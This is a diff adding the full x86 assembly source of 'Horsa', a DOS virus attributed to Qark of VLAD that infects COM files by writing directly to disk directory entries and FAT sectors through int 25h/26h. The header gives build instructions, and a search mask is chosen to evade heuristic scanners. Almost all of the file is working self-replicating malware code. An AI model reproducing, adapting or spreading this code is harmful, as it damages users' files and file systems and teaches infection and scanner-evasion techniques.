@@ -1,0 +1,785 @@
+
+;                       Horsa Virus
+;                           by
+;                       Qark [VLAD]
+;
+; This virus is a direct action parasitic com infector.  The interesting
+; thing about this virus as compared to others is that it uses its own file
+; system to infect the files.  It uses direct disk access with int25/26
+; to use the directory entries, file allocation table and clusters to do
+; its work.  It works on both 12bit and 16bit FAT's.
+;
+; If you are interested in how TBSCAN does its 'OWN' filesystem, then this
+; is the source code for you.  Infact, this is slightly more complicated
+; because writing is _much_ harder than reading.
+;
+; Unlike TBSCAN, infection by Horsa is very slow.  This is especially
+; noticable on floppy disks where it takes forever to infect any semi-large
+; file.  This is because Horsa uses no buffering whatsoever, and thus ends
+; up reading some sectors, such as some of the fat, repeatedly.
+;
+; There is one known error that is present only on floppy disks.  This will
+; pop up one in every 256 clusters.  The reason for this is that 12bit fat
+; entries take up 1.5bytes and therefore cross a sector (512bytes).  To fix
+; the error just change it so that the virus reads/writes two sectors instead
+; of one.  I didn't include it myself because the virus is slow enough as it
+; is.
+;
+; This virus is compiled using a86.  To create the .com file prepend a 16
+; byte comfile full of NOPs to the .bin produced by a86.
+;
+
+        org     0
+
+
+        cld
+        mov     di,0ffh
+        push    cs              ;This is the cs we will return to
+        inc     di              ;DI=100h
+        push    di              ;Now CS:100h is on the stack, to retf to
+        db      0b8h
+old2    dw      020cdh
+        stosw
+        db      0b0h
+old1    db      0
+        stosb
+
+        push    ds              ;Save DS so we can return the PSP seg
+        
+        call    next            ;IP onto stack
+next:
+        pop     ax              ;IP into AX
+        sub     ax,offset next  ;AX=Delta offset
+        xor     dx,dx           ;Zero DX for division
+        mov     cx,16           ;CX=Paragraph size (To convert delta into seg)
+        div     cx              ;Divide delta by 16 to round off segment
+        or      dx,dx           ;Remainder means we weren't aligned properly
+        jz      ok_offset
+        jmp     virus_exit
+ok_offset:
+        mov     cx,cs           ;CX=CS
+        add     ax,cx           ;AX=New CS
+        mov     ds,ax           ;Reset DS to new segment
+        mov     es,ax           ;and ES
+        push    ax              ;Put New CS on stack so we can retf to it
+        mov     di,offset realign
+        push    di              ;Put 'realign' on stack
+
+        retf                    ;Here we return to 'realign'.. but CS:0
+                                ;will point to the virus start.
+realign:
+        mov     ah,1ah          ;Set DTA to our storage area.
+        mov     dx,offset dta
+        int     21h
+
+        mov     ah,4eh          ;Find first
+        jmp     short ffirst
+fnext:
+        mov     ah,4fh
+ffirst:
+        xor     cx,cx
+        mov     dx,offset wild
+        int     21h
+        jnc     test_time
+        jmp     virus_exit
+test_time:
+        mov     ax,word ptr time
+        and     ax,1fh
+        cmp     ax,10h
+        je      fnext
+
+        and     byte ptr drive,3fh ;First six bits are drive, remove the rest
+        mov     dl,byte ptr drive
+        mov     ah,32h          ;Get DPB into buffer
+        int     21h
+
+        ;DS:BX=DPB Address, The DPB is full of disk information.
+        
+        mov     si,bx
+        mov     di,offset DPB
+        mov     cx,21h
+        rep     movsb           ;Move the DPB to our buffer
+        push    cs
+        pop     ds
+
+        ;All the data we need to begin is now setup.
+        cmp     word ptr cluster,0
+        jne     subdirectory
+        
+        ;The root directory is a special circumstance.
+        mov     ax,word ptr count
+        mov     cx,20h
+        mul     cx
+
+        mov     cx,512
+        div     cx
+
+        mov     word ptr tempoff,dx
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,0
+        mov     ax,word ptr rootdir
+        add     word ptr csect,ax
+
+        jmp     read_direntry
+subdirectory:
+        ;Now initialise the temporary variables.
+        mov     ax,word ptr count
+        mov     word ptr tempcount,ax
+        mov     ax,word ptr cluster
+        mov     word ptr tempclust,ax
+dir_clust:
+        ;Calculate in bytes the offset of the directory entry for the file
+        ;we are infecting.
+        mov     ax,word ptr tempcount   ;AX=Direntry count from current clust
+        mov     cl,20h                  ;The size of a directory entry is 20h
+        xor     ch,ch
+        mul     cx
+
+        ;Calculate the number of bytes per cluster.
+        mov     bl,byte ptr sect_cl
+        inc     bl
+        xor     bh,bh                   ;BX=Number of sectors per cluster.
+
+        mov     cl,9                    ;Shift left by 9 = Mul by 512
+                                        ;There are 512 bytes in a sector.
+        shl     bx,cl                   ;Now BX=Bytes per cluster.
+
+        ;DX:AX=Offset of the file directory entry from the beginning of the
+        ;directory listing.  Divide that by bytes per cluster to determine if
+        ;the directory entry we need is in the current cluster.
+        div     bx
+
+        ;If AX is not zero, then directory entry is in another cluster.
+        or      ax,ax
+        jz      get_clust
+
+        ;The directory entry is in another cluster, so we'll calculate
+        ;the number of directory entries per cluster and subtract that from
+        ;the temporary count.  Then we will seek to the next cluster and try
+        ;again.
+        mov     cx,512                  ;512 bytes in a sector.
+        mov     al,byte ptr sect_cl
+        xor     ah,ah
+        inc     ax                      ;AX=Sectors per cluster.
+        mul     cx                      ;DX:AX=bytes per cluster
+        mov     cx,20h                  ;20h bytes for a directory entry.
+        div     cx                      ;AX=dir entries per cluster
+        sub     word ptr tempcount,ax   ;Update the directory count.
+        call    clust_2_clust           ;Goto the next cluster.
+        jmp     dir_clust
+
+get_clust:
+        ;DX=Offset within cluster of the directory entry.
+        ;We will use this to calculate the sector within the cluster the dir
+        ;entry is located.  This is done by dividing the byte offset by
+        ;bytes per sector.
+        mov     ax,dx                   ;AX=Offset of directory entry
+        xor     dx,dx
+        mov     cx,512
+        div     cx                      ;Divide so we get sector/offset
+
+        ;The remainder is the offset within the sector, the answer is the
+        ;sector number within the cluster.
+        mov     word ptr tempsect,ax    ;AX=sector within cluster
+        mov     word ptr tempoff,dx     ;DX=offset within that sector
+
+        ;Now update our variables so that we can read in the sector
+
+        mov     ax,word ptr tempclust
+        call    clust_2_sect
+
+        mov     ax,word ptr csect
+        mov     dx,word ptr csect+2
+
+        ;DX:AX=Sector of cluster start, we'll add the extras.
+        add     ax,word ptr tempsect
+        adc     dx,0
+
+        ;Update it.
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,dx
+read_direntry:
+        ;Read in the sector of the directory entry.
+        call    diskread
+        
+        ;Point SI to the directory data
+        mov     si,offset buffer
+        add     si,word ptr tempoff
+
+        ;Set time marker in directory sector to write it back.
+        mov     al,byte ptr [si+16h]
+        and     al,0e0h
+        or      al,10h
+        mov     byte ptr [si+16h],al
+
+        ;Save original file size
+        push    word ptr [si+1ch]
+        pop     word ptr tempsize
+
+        ;Round up original file size to 16, and add virus size
+        ;then put new file size in directory data.
+        mov     ax,word ptr [si+1ch]
+        add     ax,15
+        and     ax,0fff0h
+        add     ax,offset end_virus
+        mov     word ptr [si+1ch],ax
+        
+        ;Move the directory entry information into 'dir_entry'
+        mov     di,offset dir_entry
+        mov     cx,20h
+        rep     movsb                   ;The information has now been stored.
+        
+        ;Write the fixed up directory entry back to the disk.
+        call    diskwrite
+
+        ;Get first cluster of the file and read it into buffer
+        mov     ax,word ptr fcluster    ;AX=First cluster of file
+        call    clust_2_sect
+        call    diskread
+
+        ;Store first 3 file bytes in old2/1
+        mov     si,offset buffer
+        mov     di,offset old2
+        movsw
+        mov     di,offset old1
+        movsb
+
+        ;Now put the jump in the buffer
+        sub     si,3
+        mov     byte ptr [si],0e9h      ;JMP opcode
+
+        ;Round original file size to 16
+        mov     ax,word ptr tempsize
+        add     ax,15
+        and     ax,0fff0h
+        mov     word ptr tempsize,ax
+
+        ;Fixup as a jump and put in the buffer
+        sub     ax,3
+        mov     word ptr [si+1],ax
+        
+        ;Write the virus modified first file sector back to disk
+        call    diskwrite
+
+        ;The rest of the code is dedicated to seeking to the 
+        ;end and writing the virus body.
+                
+        mov     ax,word ptr fcluster
+        mov     word ptr tempclust,ax
+
+        ;Calculate the number of bytes per cluster.
+        mov     bl,byte ptr sect_cl
+        inc     bl
+        xor     bh,bh                   ;BX=Number of sectors per cluster.
+
+        mov     cl,9                    ;Shift left by 9 = Mul by 512
+                                        ;There are 512 bytes in a sector.
+        shl     bx,cl                   ;Now BX=Bytes per cluster.
+
+        mov     ax,word ptr tempsize
+find_last_clust:
+        cmp     ax,bx                   ;CMP filesize,clusterbytes
+        jb      sector_by_sector
+        sub     ax,bx                   ;SUB filesize,clusterbytes
+        mov     word ptr tempsize,ax
+        call    clust_2_clust
+        jmp     find_last_clust
+sector_by_sector:
+
+        mov     word ptr tempsize,ax
+
+        mov     ax,word ptr tempclust
+        call    clust_2_sect
+
+        xor     dx,dx
+        mov     cx,512
+        mov     ax,word ptr tempsize
+        div     cx
+
+        mov     word ptr tempsect,ax
+
+        add     word ptr csect,ax
+        adc     word ptr csect+2,0
+        
+        mov     word ptr tempsize,dx
+
+        call    diskread
+
+        mov     di,offset buffer
+        add     di,word ptr tempsize
+        xor     si,si
+        mov     cx,512
+        sub     cx,word ptr tempsize
+        rep     movsb
+        call    diskwrite
+
+        ;;;;    all seems alright up until this point..
+        inc     word ptr tempsect
+        add     word ptr csect,1
+        adc     word ptr csect+2,0
+
+        mov     ax,512
+        sub     ax,word ptr tempsize
+        mov     word ptr tempsize,ax
+
+next_file_sector:
+        
+        xor     bx,bx
+        mov     bl,byte ptr sect_cl
+        inc     bx
+        cmp     bx,word ptr tempsect
+        jbe     next_file_cluster
+        inc     word ptr tempsect
+        mov     si,word ptr tempsize
+        mov     di,offset buffer
+        mov     cx,512
+        rep     movsb
+        call    diskwrite
+        add     word ptr csect,1
+        adc     word ptr csect+2,0
+
+        add     word ptr tempsize,512
+        cmp     word ptr tempsize,offset end_virus
+        jb      next_file_sector
+        jmp     virus_exit
+next_file_cluster:
+        mov     word ptr tempsect,0     ;reset sector count to zero
+
+        ;this code updates the fat to add another cluster
+
+        mov     ax,word ptr fatsect
+        dec     ax
+find_free_cluster:
+        inc     ax
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,0
+
+        call    diskread
+
+        mov     si,offset buffer
+
+        cmp     word ptr clusts,0ff7h
+        jbe     find12free
+        jmp     find16free
+
+        ;this is a lame jump to stop the >128 byte jump error popping up
+freejump:
+        jmp     no_free
+;%%%%%%%%%%%%% writing to a 12bit fat routines %%%%%%%% 
+find12free:
+        ;Search for a free 12 bit cluster
+        mov     ax,word ptr csect
+        sub     ax,word ptr fatsect
+        mov     cx,512
+        mul     cx
+        mov     cx,2
+        mul     cx
+        mov     cx,3
+        div     cx
+        add     si,dx
+free12_loop:
+        cmp     si,offset buffer+511
+        jae     freejump
+        lodsw
+        test    ax,0fffh
+        jz      free12_1
+        dec     si
+        cmp     si,offset buffer+511
+        jae     freejump
+        lodsw
+        test    ax,0fff0h
+        jz      free12_2
+        jmp     free12_loop
+free12_1:
+        or      ax,0fffh                ;mark as the end of chain
+        sub     si,2
+        mov     word ptr [si],ax
+        call    diskwrite
+        
+        mov     ax,word ptr csect
+        sub     ax,word ptr fatsect
+        mov     cx,512
+        mul     cx
+        sub     si,offset buffer
+        add     ax,si
+        mov     cx,2
+        mul     cx
+        mov     cx,3
+        div     cx
+        
+        mov     word ptr tempclust2,ax
+        jmp     find_orig_Fat12
+free12_2:
+        or      ax,0fff0h               ;mark as the end of chain
+        sub     si,2
+        mov     word ptr [si],ax
+        call    diskwrite
+        
+        mov     ax,word ptr csect
+        sub     ax,word ptr fatsect
+        mov     cx,512
+        mul     cx
+        sub     si,offset buffer
+        add     ax,si
+        mov     cx,2
+        mul     cx
+        mov     cx,3
+        div     cx
+        or      ax,1
+        mov     word ptr tempclust2,ax
+find_orig_Fat12:
+        ;seek to previous fat entry and write new cluster in its place.
+        mov     ax,word ptr fatsect             ;Sector number of the fat
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,0
+
+        mov     ax,word ptr tempclust
+        mov     cx,3
+        mul     cx                              ;Mul by 3
+        mov     cx,2
+        div     cx                              ;Divide by 2
+        xor     dx,dx
+
+        mov     cx,512                          ;Divide by 512 to work out
+                                                ;which sector the next
+                                                ;cluster is in.
+        div     cx
+
+        ;DX=Offset into sector of fat entry. AX=Sector.
+        mov     si,dx                           ;SI=offset into sector
+        add     word ptr csect,ax
+        adc     word ptr csect+2,0
+
+        ;Read in the fat sector we need.
+        call    diskread
+
+        ;Get the cluster number from the fat
+        add     si,offset buffer
+        mov     ax,word ptr [si]                ;AX=cluster number
+
+        test    word ptr tempclust,1
+        jz      evenfat
+        mov     bx,word ptr tempclust2
+        mov     cl,4
+        shl     bx,cl
+        and     ax,0fh
+        or      ax,bx
+        
+        jmp     newcluster12
+evenfat:
+        mov     bx,word ptr tempclust2
+        and     ax,0f000h
+        or      ax,bx
+newcluster12:
+        mov     word ptr [si],ax
+        call    diskwrite
+        
+        ;seek to new 'free' entry
+        call    clust_2_clust
+        mov     ax,word ptr tempclust
+        call    clust_2_sect
+        
+        jmp     next_file_sector
+;%%%%%%%%%%%%% writing to a 16bit fat routines %%%%%%%% 
+find16free:
+        ;search for a free 16 bit cluster
+        lodsw
+        or      ax,ax
+        jz      foundfree16
+        cmp     si,offset buffer+512
+        jb      find16free
+        jmp     no_free
+foundfree16:                    ;found a free cluster
+        sub     si,2
+        mov     word ptr [si],0ffffh    ;mark it as last in the chain
+        call    diskwrite               ;write it
+
+        ;now convert it into an actual cluster number
+        sub     si,offset buffer
+        mov     ax,word ptr csect
+        sub     ax,word ptr fatsect
+        mov     cx,512
+        mul     cx                      ;convert sector into byte offset
+        add     ax,si                   ;dx:ax = offset of entry from start
+        adc     dx,0
+        mov     cx,2                    ;divide by 2 because 16bit
+        div     cx
+
+        mov     word ptr tempclust2,ax          ;AX=New added cluster
+
+        ;Seek to the previous last fat entry and write in the new entry
+        ;we just found.
+        mov     ax,word ptr fatsect             ;Sector number of the fat
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,0
+        
+        mov     ax,word ptr tempclust           ;Current cluster
+        mov     cx,2                            ;16bit fat, so mul by 2
+        mul     cx
+
+        mov     cx,512                          ;Divide by 512 to work out
+                                                ;which sector the next
+                                                ;cluster is in.
+        div     cx
+
+        mov     si,dx                           ;SI=offset into sector
+        add     word ptr csect,ax
+        adc     word ptr csect+2,0
+
+        call    diskread
+
+        add     si,offset buffer
+        mov     ax,word ptr tempclust2
+        mov     word ptr [si],ax
+        
+        mov     word ptr tempclust,ax
+
+        call    diskwrite
+
+        ;seek to new 'free' entry
+        ;call    clust_2_clust
+        mov     ax,word ptr tempclust
+        call    clust_2_sect
+        
+        jmp     next_file_sector
+no_free:
+        mov     ax,word ptr csect
+        jmp     find_free_cluster
+
+        
+virus_exit:
+;Do an int 21h 0dh to flush dos's buffers, that way when it next does
+;a directory listing it still won't show the file as uninfected.
+        mov     ah,0dh
+        int     21h
+
+        pop     ds
+        push    ds
+        pop     es
+
+        mov     dx,80h          ;reset the DTA
+        mov     ah,1ah
+        int     21h
+
+        retf
+
+wild    db      '*mand.com',0           ;Anti-heuristic version of *.com
+
+;-------------------------------------------------
+;----------------- Procedures --------------------
+;-------------------------------------------------
+Clust_2_Clust   Proc    Near
+;Gets the cluster from tempclust and reads the fat to update tempclust
+;to the next cluster in the chain.
+;Destroys tempoff.
+
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+
+        mov     ax,word ptr fatsect             ;Sector number of the fat
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,0
+
+        cmp     word ptr clusts,0ff7h           ;More than 0ff6h clusters
+        ja      fat16bit                        ;means 16bit fat, otherwise
+                                                ;it's a 12bit fat.
+
+        ;12bit fat entries are 1.5 bytes long so they must be multiplied
+        ;by 3 and divided by two.  ie multiplied by 1.5
+        mov     ax,word ptr tempclust
+        mov     cx,3
+        mul     cx                              ;Mul by 3
+        mov     cx,2
+        div     cx                              ;Divide by 2
+        xor     dx,dx
+        jmp     calc_fat_offset
+
+fat16bit:
+        ;Calculate the byte offset of the FAT entry of the current cluster.
+        mov     ax,word ptr tempclust           ;Current cluster
+        mov     cx,2                            ;16bit fat, so mul by 2
+        mul     cx
+
+calc_fat_offset:
+        ;Convert offset into sectors.
+        mov     cx,512                          ;Divide by 512 to work out
+                                                ;which sector the next
+                                                ;cluster is in.
+        div     cx
+
+        ;DX=Offset into sector of fat entry. AX=Sector.
+        mov     word ptr tempoff,dx             ;DX=offset into sector
+        add     word ptr csect,ax
+        adc     word ptr csect+2,0
+
+        ;Read in the fat sector we need.
+        call    diskread
+
+        ;Get the cluster number from the fat
+        mov     si,offset buffer
+        add     si,word ptr tempoff
+        mov     ax,word ptr [si]                ;AX=cluster number
+
+        cmp     word ptr clusts,0ff7h           ;Check for 12/16bit fat
+        ja      setclust
+
+        ;With a 12bit fat, the 1.5byte entries mean that you get 0.5 bytes
+        ;too much information that needs removing.  This varies between
+        ;odd/even cluster numbers.
+        test    word ptr tempclust,1
+        jz      evencluster
+        mov     cl,4
+        shr     ax,cl
+        jmp     setclust
+evencluster:
+        and     ax,0fffh
+setclust:
+        mov     word ptr tempclust,ax           ;Save it
+
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        ret
+Clust_2_Clust   Endp
+
+Clust_2_Sect    Proc    Near
+;Gets the cluster in AX and returns the sector in 'csect'.
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+
+        ;Gets the total number of sectors for that cluster.
+        mov     cl,byte ptr sect_cl
+        inc     cl
+        xor     ch,ch                   ;CX=sectors per cluster
+        xor     dx,dx
+        dec     ax                      ;Because it starts at clust 2
+        dec     ax
+        mul     cx
+
+        ;DX:AX=Number of sectors from that start of the data area.
+        ;Now we'll add the number of sectors up to the start of the data
+        ;area (this is supplied for us by the DPB), this will give us the
+        ;actual logical sector of the cluster.
+        add     ax,word ptr clust2
+        adc     dx,0
+
+        mov     word ptr csect,ax
+        mov     word ptr csect+2,dx
+
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        ret
+Clust_2_Sect    Endp
+
+DiskWrite       Proc    Near
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+
+        mov     al,byte ptr drive
+        dec     al
+        mov     cx,-1
+        mov     word ptr csblock,cs
+        mov     bx,offset cblock
+        int     26h
+        pop     ax
+
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        ret
+DiskWrite       Endp
+
+DiskRead        Proc    Near
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+
+        mov     al,byte ptr drive
+        dec     al
+        mov     cx,-1
+        mov     word ptr csblock,cs
+        mov     bx,offset cblock
+        int     25h
+        pop     ax
+
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        ret
+cblock:
+csect   dd      0
+        dw      1
+        dw      offset buffer
+csblock dw      0
+DiskRead        Endp
+End_virus:
+;-------------------------------------------------
+;-------------------- Data -----------------------
+;-------------------------------------------------
+;Temporary storage variables for use by the virus
+tempclust       dw      0
+tempclust2      dw      0
+tempsect        dw      0
+tempoff         dw      0
+tempcount       dw      0
+tempsize        dw      0
+
+DTA:
+drive   db      0
+        db      11 dup (0)      ;12
+        db      0               ;13
+count   dw      0               ;15
+cluster dw      0               ;17
+        dw      0               ;19
+        dw      0               ;21
+        db      0               ;22
+time    dw      0               ;24
+        dw      0               ;26
+        dd      0               ;30
+fname   db      13 dup (0)      ;43
+
+DPB:
+        db      0               ;drive
+        db      0               ;unit in drive ?
+        dw      0               ;bytes per sector
+sect_cl db      0               ;sectors per cluster
+shiftcl db      0               ;cluster shift
+fatsect dw      0               ;sectors before fat
+        db      0               ;number of fats
+        dw      0               ;number of root dir entries
+clust2  dw      0               ;number of cluster2
+clusts  dw      0               ;total clusters + 1
+        dw      0               ;sectors per fat
+rootdir dw      0               ;root dir sector
+        dd      0               ;address of device driver header
+        db      0               ;media id byte
+        db      0               ;disk accessed ?
+        dd      0               ;dpb pointer
+frclust dw      0               ;cluster for free space search
+        dw      0               ;free clusters on drive
+
+Dir_Entry:
+filename        db      8 dup (0)
+extension       db      3 dup (0)
+attribute       db      0
+                db      10 dup (0)
+timestamp       dw      0
+datestamp       dw      0
+fcluster        dw      0
+fsize           dd      0
+
+buffer  db      512 dup (0)
